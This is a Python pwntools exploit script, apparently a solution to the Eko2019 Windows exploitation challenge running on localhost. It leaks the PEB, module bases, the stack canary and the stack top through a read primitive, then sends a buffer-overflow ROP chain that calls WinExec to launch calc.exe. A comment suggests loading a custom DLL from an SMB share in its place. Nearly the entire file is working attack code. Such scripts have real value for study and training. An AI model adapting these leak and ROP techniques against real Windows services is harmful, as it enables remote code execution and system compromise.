from pwn import *
from ctypes import *

class header_s(Structure):
    _fields_ = [
            ("cookie", c_char * 8),
            ("size", c_int64)
            ]

def to_str(struct):
    return string_at(addressof(struct), sizeof(struct))

def send(arg):
    p = remote('localhost', 54321)
    header = header_s("Eko2019", -448)
    p.sendline(to_str(header))
    p.sendline('A'*0x1ff + arg + 'AAAAAAA')
    return p.recv()

canary_offset = 0xC240 # canary offset in memory is hardcoded for windows
known_addr_offset = 0x1000 # known addr location is baseDLL + this offset


# loop 1 - get address of PEB using gs:0x60
get_peb = p64(0x65) + p64(0x60)
peb_addr = u64(send( get_peb ))
print 'peb: ' + str(peb_addr)
# loop 2 - get ldr address using cs:<PEB+0x18>
get_ldr = p64(0x66) + p64(peb_addr + 0x18)
ldr_addr = u64(send( get_ldr ))
print 'ldr: ' + str(ldr_addr)
# loop 3 - get InMemoryOrderModuleList adress using cs:<ldr+0x20> (ekoEntry)
get_imoml = p64(0x66) + p64(ldr_addr + 0x20)
imoml_addr = u64(send( get_imoml ))
print 'imoml: ' + str(imoml_addr)
# loop 4 - get DLL base address using cs:<InMemoryOrderModuleList+0x30>
# (offset by 0x10 from where pointer located in linked list so 0x20)
get_dll = p64(0x66) + p64(imoml_addr + 0x20)
dll_addr = u64(send( get_dll ))
print 'dll: ' + str(dll_addr)
# loop 5 - leak original stack canary with cs:<base+canary_offset>
get_canary = p64(0x66) + p64(dll_addr + canary_offset)
canary_addr = u64(send( get_canary ))
print 'canary: ' + str(canary_addr)
# loop 6 - get stackBase from TIB
get_stackBase = p64(0x65) + p64(0x8)
stack_base = u64(send( get_stackBase ))
print 'stack base: ' + str(stack_base)
# loop 6.5 - loop until we get stack top (== to known_offset + known_to_rsp_offset)
# using some string address that only gets used once here
known_val = dll_addr + known_addr_offset
known_to_rsp_offset = 0x8
print 'known val: ' + str(known_val)

curr_addr = stack_base
while True:
    curr_addr -= 0x8
    print 'curr addr: ' + str(curr_addr)
    curr_val = u64(send(p64(0x66) + p64(curr_addr)))
    print 'curr val: ' + str(curr_val)
    if curr_val == known_val:
        break
curr_addr -= known_to_rsp_offset # comparing to stack value 0x8 lower than stack top
print 'stack top addr: ' + str(curr_addr)

# xor original canary with rsp value for true canary
true_canary = canary_addr ^ curr_addr
print 'true canary: ' + str(hex(true_canary))
# loop 7 - get ntdll block address using cs:<ekoEntry+0x10>)
# (offset by 0x10 from where pointer located in linked list so no offset)
get_ntdll = p64(0x66) + p64(imoml_addr)
ntdll_addr = u64(send( get_ntdll ))
print 'ntdll: ' + str(ntdll_addr)
# loop 8 - get kernel32 block address using cs:<ntdll+0x10>
get_kernel = p64(0x66) + p64(ntdll_addr)
kernel_addr = u64(send( get_kernel ))
print 'kernel: ' + str(kernel_addr)
# loop 9 - get kernel32 base address using cs:<kernel+0x30>
get_kernel_base = p64(0x66) + p64(kernel_addr + 0x20)
kernel_base = u64(send( get_kernel_base ))
print 'kernel_base: ' + str(kernel_base)
# compute address of WinExec in kernel32.dll
# can also do LoadLibraryA on smb share UNC name to run custom DLL
WinExec_offset = 0x5e800
winexec_addr = kernel_base + WinExec_offset

# location where we write the path name arg for WinExec
dst_stack = curr_addr + 0x68

# ROPchain from ropper to write our path name from dst into rcx (windows arg1 register) and call WinExec
# pop rax; ret;
pop_rax = dll_addr + 0x1167
# pop rbx; ret;
pop_rbx = dll_addr + 0x16f9
# mov rcx, rbx; call rax
mov_rcx_rbx_call_rax = dll_addr + 0x6081

# loop 10 - ROP chain to call LoadLibrary with calc.exe DLL
p = remote('localhost', 54321)
header = header_s("Eko2019", -448)
p.sendline(to_str(header))
p.sendline('A'*7 + 'C:\\Windows\\System32\\calc.exe\x00'.ljust(0x1f8,'A') + p64(0x66) + p64(kernel_addr + 0x20) +
        'A'*0x10 + p64(true_canary) + 'A'*0x10 +
        p64(pop_rax) +
        p64(winexec_addr) +
        p64(pop_rbx) +
        p64(dst_stack) +
        p64(mov_rcx_rbx_call_rax) +
        'A'*7)

# pop :)
pause()
